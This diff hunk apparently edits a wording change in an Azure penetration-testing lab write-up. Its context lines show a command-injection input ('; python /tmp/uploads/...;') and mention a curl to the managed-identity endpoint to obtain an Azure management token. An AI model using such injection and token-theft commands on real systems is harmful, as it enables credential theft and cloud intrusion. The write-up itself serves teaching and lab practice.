@@ -530,7 +530,7 @@ a lot of the time the EndOfLine or Special Character is a ```;``` - so just put 
 ; python /tmp/uploads/studentx/studentx.py;
 ```
 
-The python script is the same ```curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com``` with ```popen``` command we have performed previously:
+The python script contains the same ```curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com``` with ```popen``` command we have performed previously:
 ```
 import os
 import json
